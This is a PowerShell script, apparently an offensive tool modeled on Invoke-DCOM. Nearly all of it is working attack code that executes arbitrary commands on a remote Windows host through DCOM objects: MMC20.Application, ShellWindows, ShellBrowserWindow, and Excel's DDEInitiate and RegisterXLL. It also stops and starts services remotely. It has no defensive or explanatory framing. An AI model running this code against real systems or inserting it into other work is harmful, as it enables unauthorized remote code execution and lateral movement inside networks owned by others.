function Invoke-COM {
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $true, Position = 0, ValueFromPipeline = $true)]
        [String]
        $TargetHost,  # Renamed from $ComputerName

        [Parameter(Mandatory = $true, Position = 1)]
        [ValidateSet("MMC20.Application", "ShellWindows","ShellBrowserWindow","CheckDomain","ServiceCheck","MinimizeAll","ServiceStop","ServiceStart","DetectOffice","RegisterXLL","ExcelDDE")]
        [String]
        $DCOMMethod = "MMC20.Application",

        [Parameter(Position = 2)]
        [string]
        $Service,  

        [Parameter(Position = 3)]
        [string]
        $Pay = "calc.exe", 

        [Parameter(Position = 4)]
        [string]
        $LibraryPath  
    )

    Begin {
        $shellCLSID = 'C08AFD90-F2A1-11D1-8455-00A0C91F3880'
        $shellWinCLSID = '9BA05972-F6A8-11CF-A442-00A0C90A8F39'
    }

    Process {
        switch ($DCOMMethod) {
            "MMC20.Application" {
                $comType = [Type]::GetTypeFromProgID("MMC20.Application", $TargetHost)
                $instance = [Activator]::CreateInstance($comType)
                $instance.Document.ActiveView.ExecuteShellCommand($Pay, $null, $null, "7")
            }
            "ShellWindows" {
                $comType = [Type]::GetTypeFromCLSID($shellWinCLSID, $TargetHost)
                $instance = [Activator]::CreateInstance($comType)
                $item = $instance.Item()
                $item.Document.Application.ShellExecute("cmd.exe", "/c $Pay", "c:\windows\system32", $null, 0)
            }
            { $_ -in @("ShellBrowserWindow", "CheckDomain", "ServiceCheck", "MinimizeAll", "ServiceStop", "ServiceStart") } {
                $comType = [Type]::GetTypeFromCLSID($shellCLSID, $TargetHost)
                $instance = [Activator]::CreateInstance($comType)

                switch ($DCOMMethod) {
                    "ShellBrowserWindow" { $instance.Document.Application.ShellExecute("cmd.exe", "/c $Pay", "c:\windows\system32", $null, 0) }
                    "CheckDomain"        { $instance.Document.Application.GetSystemInformation("IsOS_DomainMember") }
                    "ServiceCheck"       { $instance.Document.Application.IsServiceRunning($Service) }
                    "MinimizeAll"        { $instance.Document.Application.MinimizeAll() }
                    "ServiceStop"        { $instance.Document.Application.ServiceStop($Service) }
                    "ServiceStart"       { $instance.Document.Application.ServiceStart($Service) }
                }
            }
            "DetectOffice" {
                $comType = [Type]::GetTypeFromProgID("Excel.Application", $TargetHost)
                $instance = [Activator]::CreateInstance($comType)
                $is64 = [bool]$instance.Application.ProductCode[21]
                Write-Host $(if ($is64) {"Office x64 detected"} else {"Office x86 detected"})
            }
            "RegisterXLL" {
                $comType = [Type]::GetTypeFromProgID("Excel.Application", $TargetHost)
                $instance = [Activator]::CreateInstance($comType)
                $instance.Application.RegisterXLL($LibraryPath)
            }
            "ExcelDDE" {
                $comType = [Type]::GetTypeFromProgID("Excel.Application", $TargetHost)
                $instance = [Activator]::CreateInstance($comType)
                $instance.DisplayAlerts = $false
                $instance.DDEInitiate("cmd", "/c $Pay")
            }
        }
    }

    End {
        Write-Output "[+] DCOM method '$DCOMMethod' executed on $TargetHost"
    }
}
